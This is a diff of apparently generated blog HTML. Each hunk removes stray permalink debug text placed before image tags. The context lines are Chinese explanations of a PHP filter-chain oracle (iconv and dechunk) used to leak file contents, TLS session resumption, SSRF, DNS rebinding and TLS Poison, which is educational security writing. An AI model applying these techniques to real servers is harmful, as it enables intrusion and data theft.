@@ -143,7 +143,7 @@ position: relative;
 &lt;/h3>&lt;p>因为使用了 production 的配置文件，所以对于一些报错等方式在这里就不太适用了，但是除了页面报错之外，我们还比较容易想到的就是服务端报错，显性的服务端报错即是服务器直接返回了 50x HTTP 状态码。&lt;/p>
 &lt;p>如何找到这个可以让服务端报错的 Oracle 呢？&lt;/p>
 &lt;p>在这里作者给出的解决方案是，使用 php filter 配合 convert.iconv.L1.UCS-4LE 编码，通过数次该编码规则可以将原字符串长度增长数倍，到一定程度会导致 PHP 产生内存错误：&lt;/p>
-&lt;p>Permalink before if: https://s1.ax1x.com/2022/09/27/xZjxN4.png&lt;img src="https://s1.ax1x.com/2022/09/27/xZjxN4.png"
+&lt;p>&lt;img src="https://s1.ax1x.com/2022/09/27/xZjxN4.png"
 loading="lazy"
 alt="image.png"
 >&lt;/p>
@@ -174,7 +174,7 @@ alt="image.png"
 &lt;/div>
 &lt;/div>&lt;p>可以看到，在使用 dechunk filter 的时候，如果我们要编码的字符第一个字节不在十六进制编码范围内，PHP 会原样输出，而在此范围内的则会输出为空。&lt;/p>
 &lt;p>那么配合这个 dechunk 我们可以干什么呢？既然 dechunk 有判断的机制在里面，所以我们貌似可以利用这个机制来作为我们的 Oracle ，那么我们是不是可以配合之前的 convert.iconv.L1.UCS-4LE 编码，倘若我们要 Leak 的字符串内容开头范围在 a-fA-F0-9 范围内，因为 dechunk 编码清空了字符串，就不会产生原来由于长度过长导致的报错；如果不在就会原样输出继续产生长度过长导致的内存错误。&lt;/p>
-&lt;p>Permalink before if: https://s1.ax1x.com/2022/09/27/xZj5NQ.png&lt;img src="https://s1.ax1x.com/2022/09/27/xZj5NQ.png"
+&lt;p>&lt;img src="https://s1.ax1x.com/2022/09/27/xZj5NQ.png"
 loading="lazy"
 alt="image.png"
 >&lt;/p>
@@ -622,7 +622,7 @@ alt="image.png"
 &lt;h3 id="part-34---the-numbers">Part 3.4 - The numbers
 &lt;/h3>&lt;p>字母处理完了，剩下的就是数字了。&lt;/p>
 &lt;p>在 Base64 编码中，因为编码规则都是相对固定的，尤其是相对字符串第一个字节来说，因为在 Base64 分组的时候，第一个字节可以直接编码得到 Base64 编码中的第一位，以 1 为例，如下：&lt;/p>
-&lt;p>Permalink before if: https://s1.ax1x.com/2022/09/27/xZbluD.png&lt;img src="https://s1.ax1x.com/2022/09/27/xZbluD.png"
+&lt;p>&lt;img src="https://s1.ax1x.com/2022/09/27/xZbluD.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以倘若我们把数字都提取到第一位，并将其进行一次 Base64 编码，得到的编码结果我们再去判断第一位是什么字母，就可以大概推算出数字的范围，例如&lt;/p>
@@ -662,7 +662,7 @@ loading="lazy"
 &lt;p>就是在第一次编码之后，无论文件内容是什么，最后结果都会是 Base64 编码字符内的 ASCII 字符，而在 Base64 编码范围内的字符的二进制，最高位都不会是 1 ，可以看看码表：&lt;a class="link" href="http://c.biancheng.net/c/ascii/" target="_blank" rel="noopener"
 >ASCII码一览表，ASCII码对照表&lt;/a>&lt;/p>
 &lt;p>而对于 Base64 编码来说，+/ 的编码分别是：111110/111111 ，可以看到最高位都需要为 1 。&lt;/p>
-&lt;p>Permalink before if: https://images.zsxq.com/FpV6lsDc0niPXFMr-vCYKKooztR4?imageMogr2/auto-orient/quality/100!/ignore-error/1&amp;amp;e=1669823999&amp;amp;token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:IlQNYaSATVI24r1di7wYEavOJf8=&lt;img src="https://images.zsxq.com/FpV6lsDc0niPXFMr-vCYKKooztR4?imageMogr2/auto-orient/quality/100!/ignore-error/1&amp;amp;e=1669823999&amp;amp;token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:IlQNYaSATVI24r1di7wYEavOJf8="
+&lt;p>&lt;img src="https://images.zsxq.com/FpV6lsDc0niPXFMr-vCYKKooztR4?imageMogr2/auto-orient/quality/100!/ignore-error/1&amp;amp;e=1669823999&amp;amp;token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:IlQNYaSATVI24r1di7wYEavOJf8="
 loading="lazy"
 >&lt;/p>
 &lt;p>而我们可以从图中看到：&lt;/p>
@@ -820,7 +820,7 @@ position: relative;
 &lt;li>向服务端发起针对 CSS/GIF/JS 的内容请求&lt;/li>
 &lt;li>浏览器获取并解析 JS 和 CSS 等内容，然后继续请求依赖资源&lt;/li>
 &lt;/ol>
-&lt;p>Permalink before if: https://www.smashingmagazine.com/provide/normal-server-response.svg&lt;img src="https://www.smashingmagazine.com/provide/normal-server-response.svg"
+&lt;p>&lt;img src="https://www.smashingmagazine.com/provide/normal-server-response.svg"
 loading="lazy"
 alt="Pic From https://www.smashingmagazine.com/2017/04/guide-http2-server-push/"
 >&lt;/p>
@@ -844,7 +844,7 @@ alt="Pic From https://www.smashingmagazine.com/2017/04/guide-http2-server-push/"
 &lt;li>同时，服务器预测到了客户端需要请求 styles.css 等静态资源，在无需客户端请求 styles.css 的情况下，随后发送 styles.css 的内容给客户端&lt;/li>
 &lt;li>浏览器依次获得 index.html/styles.css 等内容，完成解析 DOM 树构造&lt;/li>
 &lt;/ol>
-&lt;p>Permalink before if: https://www.smashingmagazine.com/provide/server-push-response.svg&lt;img src="https://www.smashingmagazine.com/provide/server-push-response.svg"
+&lt;p>&lt;img src="https://www.smashingmagazine.com/provide/server-push-response.svg"
 loading="lazy"
 alt="https://www.smashingmagazine.com/2017/04/guide-http2-server-push/"
 >&lt;/p>
@@ -888,7 +888,7 @@ alt="https://www.smashingmagazine.com/2017/04/guide-http2-server-push/"
 &lt;li>服务器发送 HEADERS 帧以响应流 2 中的 styles.css （HEADERS[2]/DATA[2]）&lt;/li>
 &lt;/ul>
 &lt;p>&lt;a class="link" href="https://imgtu.com/i/v8xkwV" target="_blank" rel="noopener"
->Permalink before if: https://s1.ax1x.com/2022/08/11/v8xkwV.png&lt;img src="https://s1.ax1x.com/2022/08/11/v8xkwV.png"
+>&lt;img src="https://s1.ax1x.com/2022/08/11/v8xkwV.png"
 loading="lazy"
 alt="v8xkwV.png"
 >&lt;/a>&lt;/p>
@@ -1065,7 +1065,7 @@ alt="v8xkwV.png"
 &lt;li>被X&lt;/li>
 &lt;/ol>
 &lt;p>&lt;a class="link" href="https://imgtu.com/i/vGEiIs" target="_blank" rel="noopener"
->Permalink before if: https://s1.ax1x.com/2022/08/11/vGEiIs.gif&lt;img src="https://s1.ax1x.com/2022/08/11/vGEiIs.gif"
+>&lt;img src="https://s1.ax1x.com/2022/08/11/vGEiIs.gif"
 loading="lazy"
 alt="vGEiIs.gif"
 >&lt;/a>&lt;/p>
@@ -1302,8 +1302,7 @@ position: relative;
 &lt;/li>
 &lt;/ol>
 &lt;p>大致流程如下图所示&lt;/p>
-&lt;p>Permalink before if: /Part1-1/1.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/1.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/1.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/1.png"
 width="642"
 height="600"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/1_hu3462543537959247634.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/1_hu15552169298129254910.png 1024w"
@@ -1357,8 +1356,7 @@ data-flex-basis="256px"
 &lt;/div>
 &lt;/div>&lt;p>同时 RFC 建议 Session ID的寿命上限为24小时，因为获得&lt;code>master_secret&lt;/code>的攻击者可能会冒充被入侵的一方，直到相应的 Session ID 失效。&lt;/p>
 &lt;p>整个重用过程我们可以从下图比较直观的看到：&lt;/p>
-&lt;p>Permalink before if: /Part1-1/2.jpeg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/2.jpeg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/2.jpeg"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/2.jpeg"
 width="1836"
 height="1017"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/2_hu16034522895641970028.jpeg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/2_hu14683972214121022341.jpeg 1024w"
@@ -1368,8 +1366,7 @@ data-flex-grow="180"
 data-flex-basis="433px"
 >&lt;/p>
 &lt;p>客户端首先发送了一个 Client Hello 消息给服务端，并且其 Session ID 为空，这时候 Server 响应了 Server Hello 当中就会返回一个 32 字节长度的 Session ID。现在客户端和服务器的 TLS 会话缓存中都存储了 Session ID，其值为 56bcf9f6ea40ac1bbf05ff7fd209d423da9f96404103226c7f927ad7a2992433。这样做的好处就是，在下一次TLS连接请求中，客户端不需要再经历完整的TLS握手。&lt;/p>
-&lt;p>Permalink before if: /Part1-1/3.jpeg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/3.jpeg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/3.jpeg"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/3.jpeg"
 width="1842"
 height="1381"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/3_hu5685188052485763642.jpeg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/3_hu5987191106732253976.jpeg 1024w"
@@ -1499,8 +1496,7 @@ data-flex-basis="320px"
 &lt;/div>
 &lt;/div>&lt;p>当客户端希望恢复会话时，它在 ClientHello 消息中的 SessionTicket 扩展中包含该票据。然后服务器对收到的票据进行解密，验证票据的有效性，从票据的内容中检索会话状态，并使用这个状态来恢复会话。如果服务器成功验证了客户端的票据，那么就可以在 ServerHello 之后加入 NewSessionTicket 握手消息来续订票据。&lt;/p>
 &lt;p>我们可以通过实例来进一步了解这个机制：&lt;/p>
-&lt;p>Permalink before if: /Part1-1/4.jpeg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/4.jpeg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/4.jpeg"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/4.jpeg"
 width="1842"
 height="1565"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/4_hu11086724455686326593.jpeg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/4_hu10671931247126582481.jpeg 1024w"
@@ -1510,8 +1506,7 @@ data-flex-grow="117"
 data-flex-basis="282px"
 >&lt;/p>
 &lt;p>客户端首先通过在 Client Hello 消息中添加 SessionTickets TLS Extension 来表明它支持无状态会话恢复（绿色部分）， Server 还会通过发送包含有空的 SessionTicket TLS Extension 的 Server Hello 消息给 Client ，表示 Server 支持 SessionTicket TLS Extension（红色部分）。&lt;/p>
-&lt;p>Permalink before if: /Part1-1/5.jpeg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/5.jpeg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/5.jpeg"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/5.jpeg"
 width="2076"
 height="1074"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/5_hu6699528371640042949.jpeg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/5_hu14076849780352559336.jpeg 1024w"
@@ -1521,8 +1516,7 @@ data-flex-grow="193"
 data-flex-basis="463px"
 >&lt;/p>
 &lt;p>在握手完成之前，也就是 Finished 之前，Server 会发送一个名为 New Session Ticket 的新 TLS 消息，其中包含加密的会话信息（如主密、使用的密码等），Server 可以在稍后使用它专门为此生成的唯一密钥进行解密。从这一点开始，Client 会将 Session Ticket 保存在它的 TLS 缓存中，直到下一次它在 Session Ticket过期之前都可以使用它与之前的 Server 恢复 TLS 会话。&lt;/p>
-&lt;p>Permalink before if: /Part1-1/6.jpeg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/6.jpeg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/6.jpeg"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/6.jpeg"
 width="2068"
 height="970"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/6_hu8403519520764410710.jpeg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/6_hu3970563753610611511.jpeg 1024w"
@@ -1627,8 +1621,7 @@ PS：这样的 Session ID 并不存储在 Server 上，否则会破坏无状态�
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>TLS 1.2 与 1.3 简要的握手对比如下图所示：&lt;/p>
-&lt;p>Permalink before if: /Part1-1/7.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/7.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/7.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/7.png"
 width="700"
 height="507"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/7_hu5015811615764569479.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1-1/7_hu16780910084401890799.png 1024w"
@@ -1767,8 +1760,7 @@ data-flex-basis="331px"
 &lt;li>服务器和客户端互相发送 Finished 消息，之后客户端和服务器可以交换加密的应用数据。&lt;/li>
 &lt;/ol>
 &lt;p>我们可以通过一个简单的例子来直观感受一下 TLS 1.3 基于 PSK 的握手过程：&lt;/p>
-&lt;p>Permalink before if: /Part1/1.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/1.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/1.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/1.png"
 width="1848"
 height="1054"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/1_hu13431061602088991543.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/1_hu13226639870873106609.png 1024w"
@@ -1778,8 +1770,7 @@ data-flex-grow="175"
 data-flex-basis="420px"
 >&lt;/p>
 &lt;p>如上图所示，Client 第一次与 Server 握手发送 Client Hello 消息时，只包含了 key_share 拓展，Server 也做出响应的回应，使用包含 key_share 拓展的消息进行回应。&lt;/p>
-&lt;p>Permalink before if: /Part1/2.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/2.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/2.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/2.png"
 width="1848"
 height="1054"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/2_hu16643620561832686201.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/2_hu1085369834701404020.png 1024w"
@@ -1789,8 +1780,7 @@ data-flex-grow="175"
 data-flex-basis="420px"
 >&lt;/p>
 &lt;p>Client 在第二次发送 Client Hello 消息时，带上了之前 Server 在 NewSessionTicket 发送的 pre_shared_key ，将其作为拓展发送至 Server ，随后 Server 响应 Server Hello 消息时，也使用 pre_shared_key 作为拓展响应，这样就完成了基于 PSK 的 Session Resumption&lt;/p>
-&lt;p>Permalink before if: /Part1/3.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/3.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/3.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/3.png"
 width="1854"
 height="1056"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/3_hu18149113057296677216.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/3_hu11418604121926832002.png 1024w"
@@ -1881,13 +1871,13 @@ data-flex-basis="421px"
 &lt;/div>&lt;h3 id="ssrf">SSRF
 &lt;/h3>&lt;p>服务器端请求伪造 (Server-Side Request Forgery, SSRF) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）&lt;/p>
 &lt;p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。&lt;/p>
-&lt;p>Permalink before if: https://dpsvdv74uwwos.cloudfront.net/statics/img/blogposts/exploiting_ssrf_vulnerability.png&lt;img src="https://dpsvdv74uwwos.cloudfront.net/statics/img/blogposts/exploiting_ssrf_vulnerability.png"
+&lt;p>&lt;img src="https://dpsvdv74uwwos.cloudfront.net/statics/img/blogposts/exploiting_ssrf_vulnerability.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="dns-rebinding">DNS Rebinding
 &lt;/h3>&lt;p>DNS重新绑定是计算机攻击的一种形式。 在这种攻击中，恶意网页会导致访问者运行客户端脚本，攻击网络上其他地方的计算机。攻击者注册一个域名（如attacker.com），并在攻击者控制下将其代理给DNS服务器。 服务器配置为很短响应时间的TTL记录，防止响应被缓存。 当受害者浏览到恶意域时，攻击者的DNS 服务器首先用托管恶意客户端代码的服务器的 IP 地址作出响应。 例如，他们可以将受害者的浏览器指向包含旨在在受害者计算机上执行的恶意 JavaScript 或 Flash 脚本的网站。&lt;/p>
 &lt;p>恶意客户端代码会对原始域名（例如attacker.com）进行额外访问，这些都是由同源政策所允许的。 但是，当受害者的浏览器运行该脚本时，它会为该域创建一个新的 DNS 请求，并且攻击者会使用新的 IP 地址进行回复。 例如，他们可以使用内部 IP 地址或互联网上某个目标的IP地址进行回复。&lt;/p>
-&lt;p>Permalink before if: https://torbencapiau.be/wp-content/uploads/2019/12/chrome_O70990jBNt-1024x574.png&lt;img src="https://torbencapiau.be/wp-content/uploads/2019/12/chrome_O70990jBNt-1024x574.png"
+&lt;p>&lt;img src="https://torbencapiau.be/wp-content/uploads/2019/12/chrome_O70990jBNt-1024x574.png"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="tls-poison">TLS Poison
@@ -1998,8 +1988,7 @@ loading="lazy"
 &lt;li>首先第一步攻击者发送一个 &lt;a class="link" href="https://jmaddux.com:25" target="_blank" rel="noopener"
 >https://jmaddux.com:25&lt;/a> 的地址给一个 Client ，Client 会首先进行 DNS 查询询问 jmaddux.com 的 IP 地址，此时攻击者自己控制的 DNS Server 可以自定义响应为一个正常的 IP ，比如 35.x.x.x ，此时我们可以给这个响应记录非常短非常短的 TTL ，以便让 Client 不要缓存我们的 DNS 记录。&lt;/li>
 &lt;/ol>
-&lt;p>Permalink before if: /Part1/4.jpg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/4.jpg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/4.jpg"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part1/4.jpg"
 width="4000"
 height="2250"
